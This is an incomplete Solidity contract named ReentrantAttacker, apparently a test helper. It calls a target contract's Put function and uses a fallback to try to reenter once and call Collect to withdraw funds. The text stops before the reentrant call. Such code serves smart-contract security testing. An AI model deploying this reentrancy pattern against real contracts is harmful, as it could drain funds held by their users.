// Minimal reentrant attacker that performs a low-level call into C.Put and reenters in fallback
contract ReentrantAttacker {
    C public target;
    bool public reentered;
    uint public times;

    constructor(address _c) {
        target = C(payable(_c));
    }

    // entry point for the test; calls Put on target
    function attack(uint _unlockTime) external payable {
        // call Put; this will trigger fallback on this contract if target calls back
        target.Put{value: msg.value}(_unlockTime);
    }

    // fallback invoked if C attempts to call this address during Put (reentrancy attempt)
    fallback() external payable {
        // try to reenter only once to change the order of operations
        if (!reentered) {
            reentered = true;
            // attempt to call Collect (or Put again) to manipulate state during original Put
            // we call Collect with 1 wei if possible to try to withdraw and thus alter balance
            // wrap in low-level call to avoid revert bubbling
